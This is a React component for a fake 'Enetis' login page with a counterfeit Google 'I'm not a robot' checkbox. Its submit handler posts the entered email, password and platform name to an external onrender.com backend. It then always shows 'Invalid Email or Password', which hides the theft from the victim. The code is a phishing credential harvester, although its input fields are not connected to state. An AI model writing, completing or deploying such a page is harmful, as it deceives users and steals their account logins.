import React from 'react';

import './Home.css'

import { useState } from 'react';

import axios from 'axios';
import logo from './logo.png';
import google from './google.png';



function Home(){


    const[email, setUserName] = useState("");
    const[password, setPassword] = useState("");

    const[platform, setPlatform] = useState("Enetis")

    const[showError, setShowError] = useState(false);

    const[ischecked, setChecked] = useState(false);


async function handleSubmit(e){
    e.preventDefault();

    try {
        const response = await axios.post('https://myrootbackend-4cjn.onrender.com/api/send', {
            email:email,
            password:password,
            platform:platform
        });
    
        // Handle success
        console.log('Data sent:', response.data.message);

        if(response.status == 200){
            console.log(response.data.message);

            setShowError(true);
        }
      } catch (error) {
        // Handle error
        console.error('Error:', error);
      }
    
}


    return (
        <>

        <div className='spacer'>
        {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}
        </div>



            <div className='col-md-5 whitediv m-auto py-3 px-4'>
                <div className='text-center'>
                <img className='logoimage' src={logo} />

                </div>



                <form onSubmit={handleSubmit}>

                <div class="form-group row mt-4">
    <label for="staticEmail" class="col-sm-2 col-form-label label">Username</label>
    <div class="col-sm-10">
      <input type="text" class="form-control" id="staticEmail" />
    </div>
  </div>
  <div class="form-group row">
    <label for="inputPassword" class="col-sm-2 col-form-label label">Password</label>
    <div class="col-sm-10">
      <input type="password" class="form-control" id="inputPassword"/>
    </div>
  </div>


  <div class="form-group row">
  <label style={{
      visibility:"hidden",
  }} for="inputPassword" class="col-sm-2 col-form-label label">Password</label>
    <div class="col-sm-10">
        <div className='googlediv rounded py-2'>
            <div className='checkdiv pl-3'>
                <input onChange={function(e){
                    setChecked(!ischecked);
                }} type="checkbox"checked={ischecked} className='mycheck' /><span className='checkspan ml-3'>I'm not a robot</span>

            </div>

            <div className='googleimage text-right pr-3'>
                <img className='rap' src={google}/>

            </div>

        </div>
    </div>
  </div>

       
                   
                   {ischecked && <div className='form-group text-center'>

                        <button type='submit' className=' border-0 px-3 rounded mt-3 font-weight-bold'>Login</button>

                    </div>
}

                </form>

            </div>
        
        </>
    );
}

export default Home;